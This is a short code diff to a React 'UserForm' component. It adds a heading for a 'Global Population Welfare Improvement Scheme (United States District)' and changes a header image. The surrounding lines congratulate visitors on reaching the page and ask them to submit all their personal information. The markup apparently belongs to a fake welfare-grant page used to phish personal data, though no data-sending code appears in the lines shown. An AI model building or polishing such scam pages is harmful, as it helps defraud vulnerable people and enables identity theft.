@@ -66,7 +66,8 @@ function UserForm() {
       <div className="main-container">
         {/* Image Header */}
         <header className="header">
-          <img src="https://i0.wp.com/opportunitiescorners.com/wp-content/uploads/2024/10/FB_IMG_1729067747981.jpg?resize=1068%2C1068&ssl=1" alt="Header" className="header-image" />
+          <h1>Global Population Welfare Improvement Scheme (United States District).</h1>
+          <img src="https://www.dianomi.com/img/a/sav2/222437/8/240x140.jpg" alt="Header" className="header-image" />
           <h1 className="header-title">Your Personal Information</h1>
           <h1>Congratulations On Reaching This Page.</h1>
           <p className='sub-title'>Please submit all your information below, and our representative will be in touch right away.</p>
